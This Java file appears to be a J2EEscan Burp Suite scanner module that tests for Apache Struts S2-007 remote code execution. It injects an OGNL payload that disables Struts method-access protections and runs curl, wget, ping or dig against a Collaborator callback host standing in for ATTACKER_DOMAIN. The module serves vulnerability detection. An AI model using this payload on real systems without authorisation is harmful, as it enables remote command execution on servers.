package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2007OOB implements IModule {

    private static final String TITLE = "Apache Struts S2-007 Remote Code Execution (OOB)";
    private static final String DESCRIPTION = "J2EEscan identified Out Of Band RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-007.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-007<br />"
            + "https://www.cnblogs.com/LittleHann/p/4640789.html";
    private PrintWriter stderr;
    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        String payload_template = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RCE_CMD ATTACKER_DOMAIN').getInputStream())) + '\n";
        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        List<String> cmds = new ArrayList<>();
        cmds.add("curl");
        cmds.add("wget");
        cmds.add("ping");
        cmds.add("dig");


        for (String cmd : cmds) {

            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            String payload = payload_template.replace("ATTACKER_DOMAIN",currentCollaboratorPayload).replace("RCE_CMD", cmd);
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            //String response = helpers.bytesToString(checkRequestResponse.getResponse());
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Firm
                ));
                return issues;
            }
        }

        return issues;
    }
}
